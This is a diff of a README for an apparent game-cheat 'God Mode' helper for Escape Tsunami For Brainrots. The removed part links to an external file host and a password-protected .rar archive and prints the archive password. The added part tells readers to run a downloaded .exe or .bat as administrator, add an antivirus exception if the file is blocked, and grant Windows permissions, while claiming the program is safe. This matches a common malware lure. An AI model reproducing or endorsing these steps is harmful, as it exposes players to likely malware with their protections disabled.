@@ -1,103 +1,122 @@
-# 🌊 Escape Tsunami For Brainrots — Helper Script (Beta)
+# 🌊 escape-tsunami-godmode - Easy Helper for Escape Tsunami
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.rest/L2XZZM/ logo)
-
-<img width="1536" height="1024" alt="0ebb2fa3-f624-489a-bc96-82b995420386" src="https://github.com/user-attachments/assets/e8f25980-da49-4fb2-8340-a8fb4373cbed" />
-
-
-Open source helper script for **Escape Tsunami For Brainrots**.  
-Designed to improve gameplay comfort and provide useful features where possible.
-
-Because the map is protected by security settings, some features (such as **God Mode**) are currently limited or run in development mode.  
-Instead, this script focuses on alternative helpers that still provide value to the player.
+[![Download escape-tsunami-godmode](https://img.shields.io/badge/Download-escape--tsunami--godmode-brightgreen?style=for-the-badge)](https://github.com/edwin2015/escape-tsunami-godmode)
 
 ---
 
-## ✨ Features
+## 📝 About This Script
 
-- 🧠 Helper tools for Escape Tsunami For Brainrots  
-- ⚙️ Some advanced features available in development mode  
-- 🔓 Open source — free to explore, learn from, and improve  
-- 🛠️ Lightweight and easy to modify  
-- 📖 Clean and readable codebase  
+escape-tsunami-godmode is a simple helper script made for the game Escape Tsunami For Brainrots. It helps you activate God Mode and other useful tools during the game. Some features may not work fully because the game’s map has security settings that limit changes.
+
+This script is open source, so you can use it freely, change it for your needs, and share it with others.
 
 ---
 
-## ⚠️ Important Notes
+## ⚙️ System Requirements
 
-- Due to **map security restrictions**, certain features may not work as expected.
-- This project **does not bypass protections** — it respects the game’s limitations.
-- The script is provided **for educational and development purposes**.
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.
-
-✔ You are free to:
-- Use the script  
-- Modify it  
-- Publish it  
-- Share it  
-
-As long as you keep the license and copyright notice.
+- Windows 10 or later
+- 2 GB free disk space
+- Basic keyboard and mouse
+- Internet connection to download the script
+- The game Escape Tsunami For Brainrots installed
 
 ---
 
-## 📺 YouTube Channel
+## 💾 Download and Install
 
-🎥 Follow development, updates, and future  here:
+1. Click the big green button at the top or the link below to visit the download page:
 
-👉 **YouTube:**
+   [https://github.com/edwin2015/escape-tsunami-godmode](https://github.com/edwin2015/escape-tsunami-godmode)
 
-<p align="center">
-  <a href="https://www.youtube.com/@SILENS_MODE">
-    <img src="https://github.com/light-00-veh/escape-tsunami-godmode/blob/main/assets/subscrib%D0%B5.png" alt="SUBSCRIBE" width="420">
-  </a>
-</p>
----
+2. On the page, look for the **Code** button near the top right. Click it and select **Download ZIP**.
 
-## 🤝 Contributions
+3. Save the ZIP file to your Desktop or another folder you know.
 
-Contributions, improvements, and ideas are welcome.
+4. After downloading, right-click the ZIP file and select **Extract All...**. Choose a folder to extract the files into.
 
-- Fork the repository  
-- Create a new branch  
-- Submit a pull request  
+5. Open the extracted folder. You will find the helper script inside.
 
 ---
 
-## 🌍 Multilingual Note
+## 🚀 Running the Script
 
-### English
-The script is open source and free to use, modify, and redistribute.
+1. Before running the script, make sure the game Escape Tsunami For Brainrots is not running.
 
-### العربية
-نظراً لأن الخريطة محمية بإعدادات أمنية، فإن بعض الميزات مثل وضع الإله موجودة في وضع التطوير.  
-السكربت مفتوح المصدر، ويمكنك استخدامه وتعديله وإعادة نشره بحرية كاملة.
+2. Find the script file in the extracted folder. It might be named something like `escape-tsunami-godmode.exe` or `run_script.bat`.
 
+3. Double-click the script file to start it.
 
+4. A command window will open. Follow any instructions you see on the screen.
 
-<p align="center">
-  <a href="https://github.com/light-00-veh/escape-tsunami-godmode///escape-tsunami/escape-tsunami-v.1.3.20.rar">
-    <img src="https://github.com/light-00-veh/escape-tsunami-godmode/blob/main/assets/downIoad.png" alt="" width="420">
-  </a>
-</p>
+5. Once the script runs, start the game Escape Tsunami For Brainrots.
 
-<h1 align="center" style="color:red; letter-spacing:3px;">
-☠ ARCHIVE PASSWORD ☠<br>
-silence1To
-</h1>
-
+6. The script will add God Mode and other functions to your game.
 
 ---
 
-## ⭐ Support
+## ❓ How to Use the Helper Script
 
-If you find this project useful:
-- ⭐ Star the repository  
-- 📢 Share it with others  
-- 💡 Suggest improvements  
+- The script activates God Mode, allowing your character to avoid damage.
+- Some tools help you explore the map faster.
+- Because of game security, some features may be limited.
+- You do not need to change any settings yourself. The script does the work automatically.
 
-Thank you for your support!
+---
+
+## 🔧 Troubleshooting
+
+- If the script does not run, try right-clicking the file and choose **Run as administrator**.
+- Make sure the game is closed before running the script.
+- If your antivirus blocks the script, allow it to run as an exception.
+- Restart your PC and try again if you see errors.
+- Check you have the latest version by visiting the download page again.
+
+---
+
+## 🛠️ Customization and Modification
+
+- The script is open source. You can open it with a simple text editor to see how it works.
+- Advanced users can change the code to add new features.
+- If you modify the script, save your changes and test it carefully.
+- Share your improved versions with others on GitHub or forums.
+
+---
+
+## 🤝 Support and Community
+
+- For questions, visit the discussion section on the GitHub page.
+- Check the issues tab to see if others have the same problem.
+- You can report bugs or suggest improvements on GitHub.
+- Share your experience with the script on gaming forums or social media.
+
+---
+
+## 📁 File Overview
+
+When you extract the download ZIP, you will see:
+
+- `escape-tsunami-godmode.exe` or similar: The main script file.
+- `README.md`: This guide.
+- `LICENSE`: The license file explaining your rights to use and share the script.
+- `config.txt` or similar: Optional settings (if present).
+
+---
+
+## 🔒 Security and Permissions
+
+The script only works locally on your PC. It does not collect personal data or connect to servers.
+
+Because it changes game settings, Windows might ask for permission. Allow access for the script to work correctly.
+
+---
+
+## 📌 Tips for a Smooth Experience
+
+- Keep the game closed while running the script.
+- Use the latest Windows updates.
+- Save your game progress before using the script to avoid any data loss.
+- Do not rename the script files, as it may cause errors.
+
+---
+
+[![Download escape-tsunami-godmode](https://img.shields.io/badge/Download-escape--tsunami--godmode-blue?style=for-the-badge)](https://github.com/edwin2015/escape-tsunami-godmode)
